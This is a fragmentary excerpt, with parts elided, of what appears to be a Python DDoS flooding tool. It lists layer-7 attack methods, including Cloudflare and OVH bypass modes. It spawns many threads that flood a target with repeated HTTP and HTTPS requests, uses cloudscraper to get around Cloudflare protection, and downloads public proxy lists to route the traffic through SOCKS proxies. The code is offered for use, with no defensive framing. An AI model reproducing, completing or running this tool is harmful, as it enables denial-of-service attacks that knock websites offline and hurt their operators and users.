...
l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB","R5S"]
...
def start_attack(method, threads, event, socks_type):
    ...
    try:
        if method == "post":
            ...
            for _ in range(threads):
                threading.Thread(target=r5s, args=(event, socks_type), daemon=True).start()        
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            cloudscraper.create_scraper(sess=s)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
...
def downloadsocks(choice):
    ...
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/Pikachu695/ProxyPool/main/pf.txt",
                             timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/Pikachu695/ProxyPool/main/pf.txt",
                timeout=5)
            f.write(r.content)
            f.close()
        except:
...
if __name__ == '__main__':
    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re ,cloudscraper
